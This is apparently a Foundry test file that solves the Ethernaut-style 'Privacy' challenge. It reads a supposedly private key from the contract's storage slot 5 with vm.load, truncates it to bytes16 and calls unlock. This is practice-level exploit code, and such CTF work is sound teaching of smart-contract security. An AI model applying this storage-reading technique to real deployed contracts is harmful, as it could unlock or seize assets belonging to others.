// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Privacy.sol";
import "src/levels/PrivacyFactory.sol";

contract TestPrivacy is BaseTest {
    Privacy private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PrivacyFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Privacy(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.locked(), true);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // Again key to unlock is stored on-chain but visibility is set to private
        // We can read the value of the key by accessing the storage slot

        // Accessing storage 5 because:
        // 0 slot -> bool locked
        // 1 slot ->  uint256 ID
        // 2 slot ->  uint8 flattening + uint8 denomination + uint16 awkwardness
        // 3 slot -> bytes32 data 0 index
        // 4 slot -> bytes32 data 1 index
        bytes32 key = vm.load(address(level), bytes32(uint256(5)));

        // Truncating key
        level.unlock(bytes16(key));

        assertEq(level.locked(), false);

        vm.stopPrank();
    }
}
